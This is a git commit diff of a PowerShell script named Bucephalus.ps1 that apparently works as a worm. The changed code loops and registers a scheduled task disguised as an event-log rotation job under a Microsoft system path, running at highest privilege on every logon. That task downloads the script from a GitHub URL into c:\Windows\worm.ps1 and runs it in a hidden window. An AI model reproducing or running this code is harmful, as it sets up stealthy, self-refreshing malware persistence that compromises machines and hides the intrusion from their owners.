3deb7e3eda41a5f11d9fe089977dcab9f0ae76ba
Anthony Magrene <ekfhalomaster@gmail.com>
2021-02-03 22:54:41 -0500

    Update Bucephalus.ps1

--- Bucephalus.ps1
+++ Bucephalus.ps1
@@ -103,15 +103,15 @@ start-job -ScriptBlock{
 start-job -ScriptBlock { 
     while(1 -eq 1){
         try{
-            Unregister-ScheduledTask -taskname 'EventLog Rotate'
-        
-        }
-        catch{
             $action = @()
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\worm.ps1'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "c:\Windows\worm.ps1"'
             $trigger = New-ScheduledTaskTrigger -AtLogon
             Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -Description "Daily rotation of event logs" -RunLevel Highest -TaskPath \Microsoft\Windows\SpacePort
+        
+        }
+        catch{
+
         }
         start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
     }
